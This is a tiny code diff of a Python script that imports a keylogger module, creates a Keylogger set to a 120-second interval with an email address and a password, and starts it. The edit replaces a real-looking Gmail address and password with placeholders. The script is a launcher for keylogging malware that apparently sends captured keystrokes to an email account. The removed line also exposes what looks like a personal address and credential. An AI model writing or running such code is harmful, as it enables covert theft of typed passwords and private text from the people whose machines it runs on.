@@ -2,7 +2,7 @@
 
 import keylogger
 
-my_logger = keylogger.Keylogger(120, "detmong18@gmail.com", "quynh.huynh")
+my_logger = keylogger.Keylogger(120, "...@gmail.com", "pass")
 
 my_logger.start()
 
